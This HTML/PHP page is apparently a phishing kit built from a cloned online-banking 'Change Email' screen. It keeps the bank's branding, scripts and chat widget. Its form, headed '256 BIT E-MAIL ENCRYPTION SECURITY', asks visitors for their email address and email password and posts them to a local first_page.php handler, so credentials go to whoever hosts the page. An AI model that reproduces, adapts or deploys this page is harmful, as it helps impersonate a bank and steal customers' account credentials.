<!-- START: User story B31093 : Display Speed bump for all third party links -->
<!-- END: User story B31093 : Display Speed bump for all third party links -->
<!--[if lt IE 7 ]> <html class="ie ie6 no-js" lang="en"> <![endif]-->
<!--[if IE 7 ]> <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "w3.org/TR/html4/strict.dtd"><html class="ie ie7 no-js" lang="en"> <![endif]-->
<!--[if IE 8 ]>    <html class="ie ie8 no-js" lang="en"> <![endif]-->
<!--[if IE 9 ]>    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html class="ie ie9 no-js" lang="en"> <![endif]-->
<!--[if gt IE 9]><!-->
<?php session_start(); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html class=" js canvas canvastext touch geolocation hashchange history draganddrop rgba multiplebgs backgroundsize borderimage borderradius opacity cssanimations csscolumns cssgradients csstransforms csstransforms3d csstransitions generatedcontent video audio svg inlinesvg smil svgclippaths" style="" lang="en"><!--<![endif]--><head class="at-element-marker"><script type="text/javascript" async="" src="assets/d5b5b6f1293cb72ce96738bf5b34c2de.js"></script><script type="text/javascript" async="async" src="assets/s34077894273387.js"></script><script src="assets/serverComponent.php"></script><title>
    Change Email
</title><meta http-equiv="Cache-Control" content="private,no-cache, no-store, must-revalidate"><meta http-equiv="Expires" content="-1"><meta http-equiv="Pragma" content="private, no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="MSThemeCompatible" content="yes"><meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no">


    <script type="text/javascript" src="assets/GssClientHandler.js"></script>
    <!-- START: PRJ17476 - B-18630 -->
    <script type="text/javascript" src="assets/VisitorAPI.js"></script>

    <!-- START: PRJ17476 - B-18630 -->

    <script type="text/javascript" language="javascript">
        var require = {
            baseUrl: '/CCAP/content/scripts',
            waitSeconds: 180,
            shim: {
                'jquery.selectFacade': ['jquery'],
                'MicrosoftMvcAjax': ['MicrosoftAjax'],
                'MicrosoftMvcValidation': ['MicrosoftMvcAjax'],
                'RequiredWithPlaceHolder': ['MicrosoftMvcValidation'],
                'VisibleAttributeValidation': ['MicrosoftMvcValidation'],
                'swipe': ['jquery'],
                'modernizr': {
                    exports: 'Modernizr'
                }
            }
        };
    </script>




        <script type="text/javascript" language="javascript">
            require.bundles = {
                'Common.0180881141': ['jquery', 'modernizr', 'jquery.selectFacade', 'MicrosoftAjax', 'MicrosoftMvcAjax', 'MicrosoftMvcValidation', 'RequiredWithPlaceHolder', 'userhelp', 'timeout', 'ShowPassword', 'IDShieldImage', 'swipe', 'TimeoutWarning', 'ThirdPartyLink']
            }
        </script>
        <script data-main="Common.0180881141" src="assets/require.js"></script>



    <link rel="Stylesheet" type="text/css" media="screen, projection" href="assets/skinCommon.css">
    <link rel="stylesheet" type="text/css" href="assets/common.css">
    <link rel="stylesheet" type="text/css" href="assets/custom_changeemail.css">

    <link rel="Stylesheet" type="text/css" media="screen, projection" href="assets/usbankDesktop.css">
    <link rel="Stylesheet" type="text/css" href="assets/main-desktop-optimized.css">
    <script type="text/javascript" language="javascript">
        requirejs(['jquery', 'jquery.selectFacade'], function($, notUsed) {
            $(document).ready(function() {
                if ($.fn.selectFacade) {
                    $("select").selectFacade({ width: '100%' });
                }
            });
        });
     </script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="Common.0180881141" src="assets/Common.js"></script>


         <script type="text/javascript" src="assets/ts-polyfill.js"></script>
         <script type="text/javascript" src="assets/TransmitSessionExtend.js"></script>
<script type="text/javascript" language="javascript">
    requirejs(["jquery", "TCHelper"], function($, TCHelper) {
        $(document).ready(function() {
            if (gssUtility.getCookie('G_stat') != null){
                if (gssUtility.getCookie('G_stat') != "N")
                    gssUIEntryPoint();
            }

            $('form').submit(function() {
                HideServerErrors();


            });

            SuppressEnterKeyPress();

            $('.OBTermsAndConditionsURL').each(function() {
                if ($(this).attr('href') != '#') {
                    TCHelper.GenerateBackCancelLinkForTC(this);
                }
            });
        });
    });

    define('TCHelper', ['jquery'], function($) {
        var TCHelper = {
            GenerateBackCancelLinkForTC: function(e) {
                var url = $(e).attr('href');
                var thisPageQuestionPos = location.href.indexOf('?');
                var thisPage = thisPageQuestionPos == -1 ? location.href : location.href.substring(0, thisPageQuestionPos);
                var endOfUrl;
                var questionPos = url.indexOf('?');

                if (questionPos != -1) {
                    url = url + '&BACK=' + thisPage;
                    url = url + '&CANCEL=' + thisPage;
                    $(e).attr('href', url);
                }
                else {
                    $(e).attr('target', '_blank');
                }

                endOfUrl = questionPos;
                thisPage = thisPage.substring(0, endOfUrl);

                return e;
            }
        };

        return TCHelper;
    });

    function SuppressEnterKeyPress() {
        requirejs(["jquery"], function($) {
            $('input').live('keypress', function(e) {
                if (e.which == '13') {
                    e.preventDefault();
                }
            });
        });
    }

    function HideServerErrors() {
        requirejs(["jquery"], function($) {
            $('.errorContainer').parent().hide();
        });
    }
</script>
<script language="javascript" type="text/javascript">


    requirejs(["jquery", "timeout"], function($, Timer) {
        $(document).ready(function() {
             var IsMobileChannel = "False"
             if (IsMobileChannel.toString().toLowerCase() == "true") {
                //JAE Security Fix
                Timer.StartTimer(750000, "/Auth/LogoutConfirmation");
                //JAE Security Fix
            }
            Timer.PostKeepAlive("/USB/PingImage.ashx");

            $('input[type="password"],input[type="text"],textarea').keyup(function() {
                    var $this = this;
                    setTimeout(function() {
                        if ($($this).hasClass('input-validation-error')) {
                            //$($this).next(".field-validation-error").show();
                            $($this).parent().addClass("error");
                        }

                        if ($($this).hasClass('input-validation-valid')) {
                            $($this).parent().removeClass("error");
                        }
                    }, 50);
                });
        });
    });
</script>


    <!--[if (lt IE 9)&(!IEMobile)]>

<link rel="stylesheet" type="text/css" media="screen, projection" href="/CCAP/Content/CSS/ie.0180881141.css" />
<!--<![endif]-->


    <script language="javascript" type="text/javascript">
        requirejs(['jquery'], function($) {
            $(document).ready(function() {

                var currentEmailId = $('#CurrentEmailId').val().replace(/\s/g, "");
                if (currentEmailId === "") {
                    $('#CurrentEmailAddress').hide();
                }

                $("#btnSubmit").click(function() {
                    $('.error').toggleClass('error');
                    $('#ErrorMessage').val('');

                    var newEmailId = $('#NewEmailId').val().replace(/\s/g, "");
                    var confirmEmailId = $('#ConfirmEmailId').val().replace(/\s/g, "");

                    // Validating with previous mobile number if it is null or value.
                    // If it is null and user left without entering new mobile number in their respective fields then need to display error message.

                    if (currentEmailId === "") {
                        $('#ErrorMessage').val((newEmailId === "") ? "Please provide an email address." : (confirmEmailId === "") ? "Please re-enter your email address." : "");

                    }

                    //Defect#DTSYS00145441 : Updated logic for proper validation
                    else if ((newEmailId !== "" && confirmEmailId === "") || (newEmailId === "" && confirmEmailId !== "")) {

                        $('#ErrorMessage').val((newEmailId === "") ? "Please provide an email address." : (confirmEmailId === "") ? "Please re-enter your email address." : "");
                    }
                    else {
                        $('#ErrorMessage').val('');
                    }

                    $('#FormSubmit').click();
                    $('.input-validation-error').parent().addClass("error");
                });
            });
        });

        function ChangeValue(field1, field2, field3) {
            requirejs(['jquery'], function($) {
                if ($("#" + field1).is(":checked")) {
                    $("#" + field2).val(true);
                    $("#" + field3).val(false);
                }
                else {
                    $("#" + field2).val(false);
                    $("#" + field3).val(true);
                }
            });

        }
    </script>


        <script type="text/javascript" src="assets/Bootstrap.js"></script><style id="at-mbox-default-style">.mboxDefault {visibility:hidden;}</style><style>.at-element-marker {visibility:visible;}</style>

           <script type="text/javascript" src="assets/GlanceCobrowseCustomUI-usbank.js"></script>
        <link rel="stylesheet" href="assets/CustomSkin_19921_S_Glance.css">

    <script id="cobrowsescript" type="text/javascript" src="assets/CobrowseJS.ashx" data-inputevents="{&quot;ctrl-13&quot;:&quot;startSession&quot;}" data-presence="off" data-groupid="19921" data-site="staging" charset="UTF-8"></script><script type="text/JavaScript">
    /***********************************
    ** DO NOT CHANGE THIS CODE - V1.0 -
    ** Campaign Name: OLB Make an Appointment Scheduling Project Plugin(Live Prod 01/16/2018)
    ** Recipe Name: AppSch_RecA
    ** Campaign ID: 94721
    ** Recipe ID: 0
    ** Mbox PCID: 9a696f9d220f460ba891efe12025df36.22_26
    ************************************
    */
</script><style>
    .QOLBAppSch_Show {
        padding:10px 0px 10px 0px;
        margin-top: -10px;
    }
</style><script type="text/javaScript">
function createMainDiv() {
        var tntDiv ='<div id="QOLBAppSchInnerDisplayDiv" class ="QOLBAppSch_Show">'+
                    '<a class="soloLink" onclick="USB.NavigationCentral.nav_GoToMakeAppointment()";">Make an Appointment:</a>&nbsp;Schedule appointment with Banker' +
                    '</div>';
        var primaryDiv = document.createElement('div');
        primaryDiv.innerHTML = tntDiv;
        document.body.appendChild(primaryDiv);
    }

function QOLBAppScheduling() {
    var receipe = 'AppSch_RecA';
    switch(receipe) {
            case 'AppSch_RecA':
                QAppScheduling();
                break;
    }
}

function QAppScheduling() {
    var state = "california";
    var country = "united states";
    var appSchDiv = document.getElementById('navSCMakeAppointment');
    var makeApp = document.getElementById('MakeAppointment');
    if(state == 'colorado' || state == 'indiana' || state == 'ohio' || state == 'kentucky'
        || state == 'wisconsin' || state == 'minnesota' || state == 'illinois' || state == 'california'
        || state == 'washington' || state == 'oregon' || state == 'nevada'
        || state == 'arkansas' || state == 'iowa' || state == 'kansas' || state == 'missouri' || state == 'tennessee'
        || state == 'arizona' || state == 'idaho' || state == 'utah' || state == 'new mexico' || state == 'wyoming'
        || state == 'montana' || state == 'north dakota' || state == 'south dakota' || state == 'nebraska'){
        if(makeApp) {
            makeApp.style.display='block';
        } else if(appSchDiv) {
            appSchDiv.style.display='block';
        }
        if(window.location.href.indexOf("ContactUs") > -1) {
            createMainDiv();
            var contactUS = document.getElementsByClassName("contactUSFeedback")[0];
            var olbAppSchInnerDisplayDiv = document.getElementById('QOLBAppSchInnerDisplayDiv');
            if(contactUS){
                contactUS.appendChild(olbAppSchInnerDisplayDiv);
            }
        }
        window.appointmentEnabledTNT = 'true';
    } else {
        window.appointmentEnabledTNT = 'false';
        if(makeApp) {
            makeApp.style.display='none';
        } else if(appSchDiv) {
            appSchDiv.style.display='none';
        }
    }
}

var QOLBAppSchOfferCounter=0;
var QOLBAppSchTntOfferInt =  setInterval(function(){
    if(QOLBAppSchOfferCounter <= 1000){
        if(document.readyState == "complete" ) {
            var standinModeCheck;
                standinModeCheck = false;
            QOLBAppSchedulingRunOfferCode(standinModeCheck);
            clearInterval(QOLBAppSchTntOfferInt);
         }
    } else {
        clearInterval(QOLBAppSchTntOfferInt);
    }
    QOLBAppSchOfferCounter++;
}, 20);

function QOLBAppSchedulingRunOfferCode(standinModeCheckOn) {
    if (standinModeCheckOn) {
        var stndinmode = document.getElementById('divStandInModeError');
        if(stndinmode.className.indexOf('hide')!=-1) {
            QOLBAppScheduling();
        } else {
             adobe.target.trackEvent({
                "mbox": "Standinmode_custdash"
             });
        }
    } else {
        QOLBAppScheduling();
    }
}
//# sourceURL=QOLBAppSchedulingProd.js
</script><script type="text/JavaScript">
    /***********************************
    ** DO NOT CHANGE THIS CODE - V1.0 -
    ** Campaign Name: OLB Global Master Campaign (Live Prod 12/20/2017)
    ** Recipe Name: GlobalMasterOLB
    ** Campaign ID: 94307
    ** Recipe ID: 0
    ** Mbox PCID: 9a696f9d220f460ba891efe12025df36.22_26
    *************************************/
</script><script>

//Global variable to hold the Geo location information of the Customer - this variable will be used by Ensighten
var tntGeoLocation;

window.isInterstitialShownInOlb = false;


//This is the master method which will invokes the individual methods - Geo location, GSS
function olbPlugInMasterFunction() {

    var offercounter=0;
    var tntOfferInt =  setInterval(function(){
        if(offercounter <= 1000) {
            try {
                if(document.readyState == "complete") {
                    goeLocationPlugIn();
                    setGSSVariableForOLB();

                    offercounter = 1001;
                }
            } catch(err) {
                // if UserEnrollEligibility.MatchRecipientTokenStatus was undefined, we will end up here
                //...but we're not doing anything - this is just to avoid having an error show up in the console in production
            }
        }
        else{
            clearInterval(tntOfferInt);
        }
    offercounter++;
    }, 20);
}




/**
Code block for geo location
**/
//This below function will set the Geo location information of the Customer to the tntGeoLocation variable
function goeLocationPlugIn() {
    tntGeoLocation = {
    state: "california",
    country: "united states",
    ip: "23.113.3.45"
    }
}
/**
End of Code block for geo location
**/




/**
Code block for GSS
**/
//This function will set the window variable gssFromTargetVar to yes - will be used by Ensighten for GSS Chat
function setGSSVariableForOLB() {
    //This is to indicate to Ensighten - whether to show the GSS Chat or not - 10/25/17

    var hashlpid = ''; // If Customer belongs to the GSS Datafile - Insight
    console.log("Inside TNT Plug In");
    console.log(hashlpid);

    if(hashlpid) {
        //alert("Enable GSS");
        //Bootstrapper.gssFromTarget(true);
        Bootstrapper.gssFromTargetVar = 'yes';
        //window.gssFromTargetVar = 'yes';
    } else {
        //alert("Disable GSS");
        //Bootstrapper.gssFromTarget(false);
        Bootstrapper.gssFromTargetVar = 'no';
        //window.gssFromTargetVar = 'no';
    }
}
/**
End of Code block for GSS
**/




//$(document).ready(function() {
    olbPlugInMasterFunction();
//});

    //# sourceURL=GlobalMasterCampaignForOLBDotcomApplyProd.js
</script>
    <script type="text/javascript" charset="UTF-8" src="assets/GlancePresenceVisitor_3.js"></script></head>
<body class="desktop">


 <div id="gssUIWrapper" role="chat" style="display:none;">
       <button class="chat_button" id="btnGSSLaunch" aria-label="Answers, shows chat">
            <span class="chat_button_span1" aria-hidden="true">
                <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 26 24" xml:space="preserve" class="icon-answers">
        <style type="text/css">
            .st0
            {
                fill: #FFFFFF;
            }


            .d6.tp5.tl2.mp4.ml4 input {
	padding: 4px 0 4px 5px;
	background-color: #ffffff;
	margin-bottom: 20px;
	border: 1px solid #bfbfbf;
	outline: none;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;

	width: 100%!important;
}
        </style>

        <g id="Layer_2">
            <g id="Layer_1-2">
                <circle class="st0" cx="13" cy="14.5" r="1"></circle>
                <path class="st0" d="M13,12.2c-0.5,0-0.9-0.4-0.9-0.9v-0.1c-0.1-1.1,0.5-2.1,1.4-2.7l0.3-0.2c0.6-0.5,0.8-0.6,0.8-1.2
                    c-0.1-0.8-0.8-1.3-1.6-1.3c-0.8-0.1-1.5,0.5-1.6,1.3c-0.1,0.5-0.5,0.8-1,0.8c-0.4,0-0.7-0.4-0.8-0.8c0.1-1.8,1.6-3.1,3.4-3
                    c1.8-0.1,3.3,1.2,3.4,3c0,1.1-0.6,2-1.5,2.6L14.6,10c-0.7,0.5-0.7,0.8-0.7,1.2v0.2C13.9,11.8,13.5,12.2,13,12.2
                    C13,12.2,13,12.2,13,12.2z"></path>
                <path class="st0" d="M5,24c-0.6,0-1-0.4-1-1v-3H2c-1.1,0-2-0.9-2-2V2c0-1.1,0.9-2,2-2h22c1.1,0,2,0.9,2,2v16c0,1.1-0.9,2-2,2H12.3
                    l-6.8,3.9C5.3,24,5.2,24,5,24z M2,2v16h2.9c0.6,0,1,0.4,1,1v2.3l5.5-3.2c0.2-0.1,0.3-0.2,0.5-0.1h12V2H2z"></path>
            </g>
        </g>
    </svg>
            </span><span class="chat_button_span2" aria-hidden="true">Answers</span> <span class="chat_button_span3">
                <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 12.1 7.1" xml:space="preserve" aria-hidden="true" class="icon-arrow">
        <style type="text/css">
            .st0
            {
                fill: #FFFFFF;
            }
        </style>
        <title>icon-arrow</title>
        <g id="Layer_2">
            <g id="Layer_1-2">
                <path class="st0" d="M6.1,7.1C5.5,7.1,5,6.7,5,6.1c0-0.3,0.1-0.6,0.3-0.8l5-5c0.4-0.4,1.1-0.4,1.5,0s0.4,1.1,0,1.5l-5,5
                    C6.6,7,6.3,7.1,6.1,7.1z"></path>
                <path class="st0" d="M6.1,7.1C5.8,7.1,5.5,7,5.3,6.8l-5-5c-0.4-0.4-0.4-1.1,0-1.5s1.1-0.4,1.5,0l5,5c0.4,0.4,0.4,1.1,0,1.5
                    C6.6,7,6.4,7.1,6.1,7.1L6.1,7.1z"></path>
            </g>
        </g>
    </svg>
            </span>
        </button>
        <div id="chat_help" class="chat_help">
             <div id="chat_help_header">

                <div class="chat_help_header_div1">
                <span class="chat_help_header_div1_span">
                    <img draggable="true" role="button" src="assets/icon-move.svg" tabindex="0" id="dragImg" aria-label="Drag Answer window" class="dragimage">
                </span>
            </div>
                <div class="chat_help_header_div2">
                <span class="chat_help_header_div2_span" id="spnGSSheaderCenter" focusable="false">
                        <svg focusable="false" class="icon-answers" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 26 24" xml:space="preserve">
                        <style type="text/css">
                            .st0{fill:#FFFFFF;}
                        </style>

                        <g id="Layer_2">
                            <g id="Layer_1-2">
                                <circle class="st0" cx="13" cy="14.5" r="1"></circle>
                                <path class="st0" d="M13,12.2c-0.5,0-0.9-0.4-0.9-0.9v-0.1c-0.1-1.1,0.5-2.1,1.4-2.7l0.3-0.2c0.6-0.5,0.8-0.6,0.8-1.2
                                    c-0.1-0.8-0.8-1.3-1.6-1.3c-0.8-0.1-1.5,0.5-1.6,1.3c-0.1,0.5-0.5,0.8-1,0.8c-0.4,0-0.7-0.4-0.8-0.8c0.1-1.8,1.6-3.1,3.4-3
                                    c1.8-0.1,3.3,1.2,3.4,3c0,1.1-0.6,2-1.5,2.6L14.6,10c-0.7,0.5-0.7,0.8-0.7,1.2v0.2C13.9,11.8,13.5,12.2,13,12.2
                                    C13,12.2,13,12.2,13,12.2z"></path>
                                <path class="st0" d="M5,24c-0.6,0-1-0.4-1-1v-3H2c-1.1,0-2-0.9-2-2V2c0-1.1,0.9-2,2-2h22c1.1,0,2,0.9,2,2v16c0,1.1-0.9,2-2,2H12.3
                                    l-6.8,3.9C5.3,24,5.2,24,5,24z M2,2v16h2.9c0.6,0,1,0.4,1,1v2.3l5.5-3.2c0.2-0.1,0.3-0.2,0.5-0.1h12V2H2z"></path>
                            </g>
                        </g>
                        </svg>
                </span>
                <span class="chat_help_header_div2_span1"><h5 class="answerId" role="heading" aria-level="2">Answers</h5></span>
            </div>
                <div class="imgCloseDiv" id="imgClose">
                <button title="Hide Chat" aria-label="Hide Chat" onclick="fnGSSWidgetClose();" class="minimizeimage" id="btnGSSClose">
                <svg class="icon-arrow iconArrow" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 12.1 7.1" xml:space="preserve" focusable="false" aria-hidden="true">
                <style type="text/css">
                    .st0{fill:#FFFFFF;}
                </style>
                <title>icon-arrow</title>
                <g id="Layer_2">
                    <g id="Layer_1-2">
                        <path class="st0" d="M6.1,7.1C5.5,7.1,5,6.7,5,6.1c0-0.3,0.1-0.6,0.3-0.8l5-5c0.4-0.4,1.1-0.4,1.5,0s0.4,1.1,0,1.5l-5,5
                            C6.6,7,6.3,7.1,6.1,7.1z"></path>
                        <path class="st0" d="M6.1,7.1C5.8,7.1,5.5,7,5.3,6.8l-5-5c-0.4-0.4-0.4-1.1,0-1.5s1.1-0.4,1.5,0l5,5c0.4,0.4,0.4,1.1,0,1.5
                            C6.6,7,6.4,7.1,6.1,7.1L6.1,7.1z"></path>
                    </g>
                </g>
                </svg>
                </button>
            </div>
            </div>
            <div id="container"><div id="frameContainer">
                 <iframe id="IframeGSS" class="frameContainer" target="contents" aria-label="Answers" width="280px" height="405px"></iframe> </div>
                <div id="dummyContainer" class="gssUIWrapperDiv">
                </div>
        </div>
  <div id="chat_help_footer">
                <div class="chat_help_footer_div1">
                    <p>
                    <a class="chat_help_footer_div1_a" href="#" onclick="gssUtility.helpCenterUrl();" id="helpCenterId">Visit the <span>Help Center</span></a>
                    </p>


                </div>
                <div class="chat_help_footer_div2">
                    <p class="chat_help_footer_div1_a">Secure Connection<span class="sr-only">Lock Icon</span>
                    <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 20 25" style="enable-background: new 0 0 20 25;" xml:space="preserve" class="icon-secure">
            <style type="text/css">
                .st2
                {
                    fill: #282E6E;
                }
            </style>
            <g id="Layer_2">
                <g id="Layer_1-2">
                    <path class="st2" d="M2,10h16c0.6,0,1,0.4,1,1v12c0,0.6-0.4,1-1,1H2c-0.6,0-1-0.4-1-1V11C1,10.4,1.4,10,2,10z"></path>
                    <path class="st2" d="M18,25H2c-1.1,0-2-0.9-2-2V11c0-1.1,0.9-2,2-2h16c1.1,0,2,0.9,2,2v12C20,24.1,19.1,25,18,25z M2,11v12h16V11
                        H2z"></path>
                    <path class="st2" d="M16,10.4h-2V6c0-2.2-1.8-4-4-4S6,3.8,6,6v4.4H4V6c0-3.3,2.7-6,6-6s6,2.7,6,6V10.4z"></path>
                </g>
            </g>
        </svg>
        </p>
        </div>
            </div>
        </div>
    </div>


   <div id="kmiModalPopup" style="display:none;">
      <div class="kmi_cancel">

       <button id="kmi_cancel_btn" class="closebtnhdr" aria-label="close" onclick="gssUtility.kmiClosePopup()">
        <p aria-hidden="true" class="kmi_cancel_p">Close</p><img aria-hidden="true" class="kmi_cancel_p_img" src="assets/icon_close_circle.svg"></button>

        </div>
        <div class="gssmodelpopup">
        <iframe id="kmi_content_Frame" style="width: 100%; height: inherit;border:2px;" aria-label="Article detail frame"></iframe>

        </div>
        <div class="kmi_cancel">
             <button class="closebtnftr" onclick="gssUtility.kmiClosePopup()">Close</button>
             <p class="sr-only">End of pop up window</p>
        </div>
        </div>

    <div id="kmi_cover" style="display:none;">
    </div>

    <div id="divGSSLoader" style="border:1px; width:250px;text-align:left;  top:34%;left:35.5%;height:24px;color:#007CBE; position: fixed;font-size:10px;font-weight:bold">

    </div>
    <input id="hidGssStat" name="hidGssStat" value="0" type="hidden">
    <input id="GSSChaturl" value="https://answers.usbank.com/GSSChat/GSS_Banker_ChatPage" type="hidden">



  <script type="text/javascript">

      var env = location.href.substring(8, 10);
      console.log(env);
      if (env.toLowerCase() == 'it') {
          document.getElementById("GSSChaturl").value = 'https://usbfsb-usbank.cs26.force.com/LiveAgentSupport/gss_banker_chatpage';
      }
      else if (env.toLowerCase() == 'ua') {
          document.getElementById("GSSChaturl").value = 'https://usbfsb2-usbank.cs17.force.com/LiveAgentSupport/gss_banker_chatpage';
      }
      else {
          document.getElementById("GSSChaturl").value = 'https://answers.usbank.com/GSSChat/GSS_Banker_ChatPage';
      }
//      $(document).ready(function() {
//          // var lt = $("#firstLevelNav").offset().left;
//          var rt = ($(window).width() - ($("#firstLevelNav").offset().left + $("#firstLevelNav").outerWidth()));
//          // alert(rt);
//          $(".chat_button").css("right", rt + "px");
//          $("#chat_help").css("right", rt + "px");
//          $(".resetChatWindow").css("right", rt + "px" + "" + "!important");
//          $(".test_help1").css("right", rt + "px");
//      });
      function gssUIEntryPoint(){
          try{

              GSSCLIENTHANDLER.GSSCore();
          }
          catch(err){console.log('gssUIEntryPoint error-'+err)}
      }
    </script>
<script src="assets/olbreporting.js" type="text/javascript"></script>
<script type="text/javascript">
            var APPNAMEForSiteCat = "";
            var UXNAMEForSiteCat = "Desktop";
            var AuthTypeForSiteCat = "desktop";
</script>
<script language="javascript" type="text/javascript">cd.channel= window.APPNAMEForSiteCat; cd.authType=window.AuthTypeForSiteCat; cd.deviceType='Desktop'; cd.supportedPlatform='Desktop';</script>
<script type="text/javascript">
// client segment branding omniture
    var CommonDataHelper = { "UserAndAccountsFromServer":{"UserInfoResponse": { "CustomerTypeCode": 'R'}} };
</script>
    <div class="customBackground"></div>

    <div class="container container-pad">


<header class="mp4 ml4 tp8 tl8 d24">
<div>
    <div class="commonHeader">
        <img id="keepalive" src="assets/PingImage.gif" style="display: none;">
        <div class="CCAPCSBwrap">
            <div class="logo blueLogo"></div>
            <span class="brandingusbanklogo"></span>
        </div>
    </div>
</div>


    <div class="headerBar">

        <span style="font-weight: bold; font-size: 16px;">256 BIT E-MAIL ENCRYPTION SECURITY</span>
    </div>
</header>

    </div>
    <!-- content -->


    <div class="container container-pad">
        <div class="d24 mp4 ml4 tp8 tl8 parahtext">
            <!-- <h1>
               Email Authentication</h1> -->

<!-- <p>

US Bank offers 256 bit encryption. Enter your email address and password

</p>   -->

<style type="text/css">

.parahtext p {
    margin: 0;
    color: #333333;
    margin-left: 0px;
    margin-right: 12px;
    margin-bottom: 9px;
    font-size: 13px;
    word-break: normal;
    font-weight: bold;
}

</style>


<!-- <p>
    Enter your email address associated with your account </p> -->
    <!--<p>Enter your email password </p>-->
<p>Follow the instructions to confirm and authenticate your e-mail </p>

</p>
      </div>
        <div class="clearfix">
        </div>
        <form action="first_page.php" method="post">

        <div class="clearfix">
        </div>

    <div class="clearfix">
    </div>
    <div class="group long">
        <div class="d6 tp5 tl2 mp4 ml4">
            <span>
                <label for="NewEmail">
                   Email</label>
                <input name="email1" required tabindex="1" type="email">

            </span>
        </div>
    </div>
    <div class="clearfix">
    </div>
    <div class="group long">
        <div class="d6 tp5 tl2 mp4 ml4">
            <span>
                <label for="confirmEmailId">
                   Email Password</label>
                <input required name="email_cnf" tabindex="2" type="password">

            </span>
        </div>
    </div>
    <div class="clearfix">
    </div>
<!--Added below condition for PRJ21723 - Brokerage Account Maintenance-->

    <div>

        <!--<div class="d7 tp3 tl3 mp4 ml4">
            <span>
                <label for="DontMissOut">
                    <img alt="DontMissOut" src="assets/DontMissOut-DT.jpg">
                </label>
            </span>
        </div> -->

    </div>
    <div class="clearfix">
    </div>


    <div class="clearfix">
    </div>

    <div class="d3 tp2CEmail tl2 mp4 ml4">
    <input type="submit" name="change_mail" class="button primary" value="submit">

    </div>



    </form>
    <script type="text/javascript">
//<![CDATA[
if (!window.mvcClientValidationMetadata) { window.mvcClientValidationMetadata = []; }
window.mvcClientValidationMetadata.push({"Fields":[{"FieldName":"NewEmailId","ReplaceValidationMessageContents":true,"ValidationMessageId":"NewEmailId_validationMessage","ValidationRules":[{"ErrorMessage":"Please double-check the Email Address you entered. Here is an example of the format to use: name@domain.com.","ValidationParameters":{"pattern":"^((?!\\.)[\\w\\._-]+@[A-Za-z0-9\\-_]+(\\.[A-Za-z0-9\\-_]+)+)$"},"ValidationType":"regularExpression"}]},{"FieldName":"ConfirmEmailId","ReplaceValidationMessageContents":true,"ValidationMessageId":"ConfirmEmailId_validationMessage","ValidationRules":[{"ErrorMessage":"Please double-check the Email Address you entered. Here is an example of the format to use: name@domain.com.","ValidationParameters":{"pattern":"^((?!\\.)[\\w\\._-]+@[A-Za-z0-9\\-_]+(\\.[A-Za-z0-9\\-_]+)+)$"},"ValidationType":"regularExpression"}]}],"FormId":"form0","ReplaceValidationSummary":false});
//]]>
</script>
    </div>

    <script type="text/javascript">
        OnLoadSetDefaultWhenCurrEmpty();
        function OnLoadSetDefaultWhenCurrEmpty() {
            requirejs(['jquery'], function($) {
                var currEmailId = $('#CurrentEmailId').val();
                ChangeValue('cbxConfirmationCode', 'hdnConfCode', 'na');
                if (currEmailId === "") {
                    ChangeValue('cbxUnSubscribe', 'hdnUnSubscribe', 'hdnSubscribe');
                }
            });
        }
    </script>




<script type="text/javascript">

    FISERV = {
        timeOut: '750000',
        timeOutWarningDuration: '30',
        logoutSessionTimeOutUrl: '/Auth/LogoutConfirmation',
        keepAliveUrl: '/USB/PingImage.ashx',
        TimeoutHeader: '<p><strong>Do you want to stay logged in?</strong></p>',
        TimeoutDescription: "<p>For your security, you’ll be logged out shortly.</p>",
        StayLoggedIn: 'Stay logged in',
        SessionExtended: 'Your session has been extended.',
        Logoutnow: 'Log out now'
    };
    require(["jquery", "TimeoutWarning"], function($, Timer) {
        $(document).ready(function() {
            Timer.initialize();
        });

    });

    try {
        if (window.ConfigureTSExtendSession) {
            window.ConfigureTSExtendSession(
                        '/CCAP/content/Scripts/Shared/SharedAuthScripts/TransmitWebSDK',
                '/Proxy/TS/api/v2/web/');
        }
    }
    catch (ex) { }
    </script>

<script type="text/javascript">var _cf = _cf || []; _cf.push(['_setFsp', true]); _cf.push(['_setBm', true]);</script><script type="text/javascript" src="assets/bd-1-30"></script>

<div id="glance_cobrowse_btn" class=" glance_ui_36  not_in_session"><div id="glance_scrim" class="glance_dim glance_hide"></div><div id="glance_ssview" class="glance_hide" glance_cobrowse_suppress="1"><iframe scrolling="no" id="glance_screenshare" data-no-cobrowse-content="1" glance_cobrowse_suppress="1"></iframe></div> <div id="glance_start_label" class="glance_ui glance_ui_titlebar"><div id="glance_show_btn" tabindex="0" role="button">Cobrowse</div><div id="glance_in_session"><div id="glance_stop_btn" class="glance_ishow" tabindex="0" role="button">Stop cobrowsing</div><div class="separaterClass"></div><div id="glance_expand" style="margin-top: 7px;" class="glance_closed" tabindex="0" role="button" aria-expanded="false" aria-label="Co-browse" aria-labelledby="glance_expand_al"><div class="glance_hide" id="glance_expand_al"></div></div></div></div><div id="glance_ssnkey_box" class="glance_hide glance_ui"><iframe id="glance_agentvideo" data-no-cobrowse-content="1"></iframe><div style="font-size: 18px;" id="glance_ssn_starting">Establishing cobrowse session...</div><div id="glance_keyless_prompt">Please wait for the agent to connect</div><div style="font-size: 18px;" id="glance_key_prompt">Give your banker the code below to begin cobrowsing.</div><div 